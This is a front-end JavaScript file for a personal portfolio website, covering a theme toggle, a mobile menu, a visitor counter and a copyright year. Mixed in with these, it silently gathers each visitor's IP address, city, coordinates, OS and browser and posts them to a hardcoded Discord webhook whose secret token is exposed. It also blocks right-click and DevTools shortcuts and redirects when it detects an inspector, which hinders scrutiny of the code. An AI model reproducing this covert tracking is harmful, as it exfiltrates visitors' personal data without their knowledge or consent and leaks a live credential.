// New Dev Tools Detection
(function() {
    const threshold = 200; // Time threshold for detection
    const start = Date.now();
    let devToolsOpen = false;

    function checkDevTools() {
        const end = Date.now();
        const isDevToolsOpen = (end - start > threshold) && 
            (window.outerWidth - window.innerWidth > 160 || 
            window.outerHeight - window.innerHeight > 160);
        
        if (isDevToolsOpen && !devToolsOpen) {
            devToolsOpen = true;
            handleDevToolsDetected();
        } else if (!isDevToolsOpen && devToolsOpen) {
            devToolsOpen = false; // Reset state when DevTools are closed
        }
        requestAnimationFrame(checkDevTools); // Continue checking
    }

    function handleDevToolsDetected() {
        alert('Developer Tools detected! Please close them to continue.');
        // Optionally redirect or perform other actions
        // window.location.href = 'error.html'; // Uncomment this line if you want to redirect
    }

    window.addEventListener('load', () => {
        checkDevTools(); // Start checking for DevTools

        window.addEventListener('resize', () => {
            const widthThreshold = window.outerWidth - window.innerWidth > 160;
            const heightThreshold = window.outerHeight - window.innerHeight > 160;

            if (widthThreshold || heightThreshold) {
                if (!devToolsOpen) {
                    devToolsOpen = true;
                    handleDevToolsDetected();
                }
            } else if (devToolsOpen) {
                devToolsOpen = false; // Reset state when DevTools are closed
            }
        });
    });
})();

document.addEventListener('DOMContentLoaded', () => {
    function showCustomErrorModal(title, message) {
        if (document.getElementById('custom-error-modal')) return;

        const modal = document.createElement('div');
        modal.id = 'custom-error-modal';
        modal.innerHTML = `
            <div id="error-content">
                <img src="./assets/images/404 Error.gif" alt="Error">
                <h2>${title}</h2>
                <p>${message}</p>
                <button id="close-error">Close</button>
            </div>
        `;
        document.body.appendChild(modal);

        document.getElementById('close-error').addEventListener('click', () => {
            modal.remove();
        });
    }

    function checkNetworkConnection() {
        if (!navigator.onLine) {
            showCustomErrorModal('Network Disconnected', 'Please check your internet connection and try again.');
        }
    }

    // Network Event Listeners
    window.addEventListener('online', () => {
        const errorModal = document.getElementById('custom-error-modal');
        if (errorModal) errorModal.remove();
    });

    window.addEventListener('offline', checkNetworkConnection);

    // Prevent right-click context menu
    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        showCustomErrorModal('Action Blocked', 'Right-click is disabled on this page.');
    });

    // Fetch Error Handling
    window.addEventListener('fetch', (event) => {
        event.respondWith(
            fetch(event.request).catch(() => {
                showCustomErrorModal('Fetch Error', 'Unable to load resource.');
                return new Response(null, { status: 404 });
            })
        );
    });

    // Initial network check
    checkNetworkConnection();
});

// Theme toggle functionality
const themeToggle = document.getElementById('theme-toggle');
const themeIcon = themeToggle.querySelector('i');

// Check for saved theme preference...
const savedTheme = localStorage.getItem('theme');

// Initial theme setup
if (savedTheme === 'dark') {
    document.body.classList.add('dark-mode');
    themeIcon.classList.remove('fa-moon');
    themeIcon.classList.add('fa-sun');
} else {
    document.body.classList.remove('dark-mode');
    themeIcon.classList.remove('fa-sun');
    themeIcon.classList.add('fa-moon');
}

// Theme toggle event listener
themeToggle.addEventListener('click', () => {
    document.body.classList.toggle('dark-mode');

    if (document.body.classList.contains('dark-mode')) {
        themeIcon.classList.remove('fa-moon');
        themeIcon.classList.add('fa-sun');
        localStorage.setItem('theme', 'dark');
    } else {
        themeIcon.classList.remove('fa-sun');
        themeIcon.classList.add('fa-moon');
        localStorage.setItem('theme', 'light');
    }
});

// Mobile menu toggle
const menu = document.getElementById('menu');
const navbar = document.querySelector('.nav-links');

menu.addEventListener('click', () => {
    menu.classList.toggle('fa-times');
    navbar.classList.toggle('nav-toggle');
});

// Hide mobile menu on scroll/load
window.addEventListener('scroll', () => {
    menu.classList.remove('fa-times');
    navbar.classList.remove('nav-toggle');

    // Scroll to top button visibility
    if (window.scrollY > 60) {
        document.querySelector('#scroll-top').classList.add('active');
    } else {
        document.querySelector('#scroll-top').classList.remove('active');
    }
});

// Tab title change on visibility change
document.addEventListener('visibilitychange', () => {
    document.title = document.visibilityState === "visible" ? "Vikash's Portfolio" : "Please Come Back!🥺";
});

// Discord webhook URL placeholder
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1262504162751680582/6BqMbWkomK8CpKQl2HaHVDWS-cAFEJtmGDbjsiBvBSNk14boIbZbXGm-Px7sDzUdU0I2';

// Initial loading screen handling
document.addEventListener("DOMContentLoaded", function () {
   setTimeout(() => { 
       document.getElementById("loadingScreen").style.display = "none"; 
       document.getElementById("mainContent").style.display = "block"; 
   }, 1000);
});

// Function to get client IP address
async function getClientip() {
   try{
       let response = await fetch("https://api.ipify.org?format=json");
       let data = await response.json();
       return data.ip;
   } catch(error){
       console.error("Error fetching IP address:", error);
       return "Unable to fetch IP";
   }
}

// Function to get visitor location based on IP
async function getVisitorLocation(ip) {
   try{
       let response = await fetch(`https://ipinfo.io/${ip}/json`);
       let data = await response.json();
       return { 
           country: data.country, 
           city: data.city, 
           latitude: data.loc.split(",")[0], 
           longitude: data.loc.split(",")[1] 
       };
   } catch(error){
       console.error("Error fetching location data:", error);
       return { country: "Unable to fetch location", city: "", latitude: "", longitude: "" };
   }
}

// Function to get visitor OS and browser information...
// [Continue with your existing functions here]

function getVisitorOS() {
   let os = "Unknown OS";
   if (navigator.appVersion.indexOf("Win") != -1) os="Windows";
   else if(navigator.appVersion.indexOf("Mac") != -1) os="MacOS";
   else if(navigator.appVersion.indexOf("X11") != -1) os="UNIX";
   else if(navigator.appVersion.indexOf("Linux") != -1) os="Linux";
   
   return os;
}

function getVisitorBrowser() {
   let userAgent=navigator.userAgent;
   let browser="Unknown Browser";

   if(userAgent.match(/firefox|fxios/i)) browser='Firefox';
   else if(userAgent.match(/samsungbrowser/i)) browser='Samsung Internet';
   else if(userAgent.match(/opr\//i)||userAgent.match(/opera|opr/i)) browser='Opera';
   else if(userAgent.match(/trident/i)) browser='Internet Explorer';
   else if(userAgent.match(/edg/i)) browser='Microsoft Edge';
   else if(userAgent.match(/chrome|crios/i)) browser='Chrome';
   else if(userAgent.match(/safari/i)) browser='Safari';

   return browser;
}

async function sendToDiscord(ip, location, os, browser) { 
   const googleMapsUrl=`https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
   
   const message={ content:`New visitor detected! IP Address: ${ip} Location: ${location.country}, ${location.city} (${location.latitude}, ${location.longitude}) Google Maps: ${googleMapsUrl} Operating System: ${os} Browser: ${browser}` };

   await fetch(DISCORD_WEBHOOK_URL, { method:'POST', headers:{ 'Content-Type':'application/json' }, body:JSON.stringify(message)});
}

function isVisitorCounted() { 
   let visited=document.cookie.includes("visited=true"); 
   
   if(!visited){ 
       document.cookie='visited=true; max-age=86400'; 
   } 

   return visited; 
}

function getVisitorCount() { 
   let count=localStorage.getItem("visitorCount")||0; 
   
   return parseInt(count); 
}

function updateVisitorCount() { 
   if(!isVisitorCounted()){ 
       let count=getVisitorCount(); 
       count++; 
       localStorage.setItem("visitorCount", count); 
       
       return count; 
   }else{ 
       return getVisitorCount(); 
   } 
}

let visitorCount=updateVisitorCount(); 

document.getElementById("visitorCount").textContent=visitorCount;

getClientip().then(ip=>{ 
     document.getElementById("Clientip").textContent=ip; 

     getVisitorLocation(ip).then(location=>{ sendToDiscord(ip, location, getVisitorOS(), getVisitorBrowser()); }); 
});

window.addEventListener("contextmenu", e=>{ e.preventDefault(); }); 

window.addEventListener("keydown", e=>{ 
     if(e.key==="F12"){ e.preventDefault(); } 
});

window.addEventListener("keydown", e=>{ 
     if(e.ctrlKey && e.shiftKey && e.key==="I"){ e.preventDefault(); } 
});

function detectDevTools() { 
     let startTime=performance.now(); debugger; let endTime=performance.now(); 

     if(endTime-startTime>1){ alert("Developer tools detected! Please close them to continue."); window.location.href='about:blank'; } 
}

detectDevTools();

function openFullscreen(imgElement) { 
     // Check for mobile devices using window width
     if(window.innerWidth<=768){ console.log("Full screen disabled on mobile devices."); return; }

     // If not mobile, proceed to request full screen
     if(imgElement.requestFullscreen){ imgElement.requestFullscreen(); } 
     else if(imgElement.webkitRequestFullscreen){ imgElement.webkitRequestFullscreen(); } 
     else if(imgElement.msRequestFullscreen){ imgElement.msRequestFullscreen(); }  
}

// Function to automatically update the copyright year
function updateCopyrightYear() { 
     // Select the element with the copyright notice (h2)
     const copyrightElement=document.querySelector("h2.credit"); 

     // Get the current year
     const currentYear=new Date().getFullYear(); 

     // Update the copyright notice
     if(copyrightElement){ copyrightElement.innerHTML=`&copy; ${currentYear} Vikash J. All Rights Reserved.`; }  
}

// Run the update when the page loads
document.addEventListener("DOMContentLoaded", updateCopyrightYear);
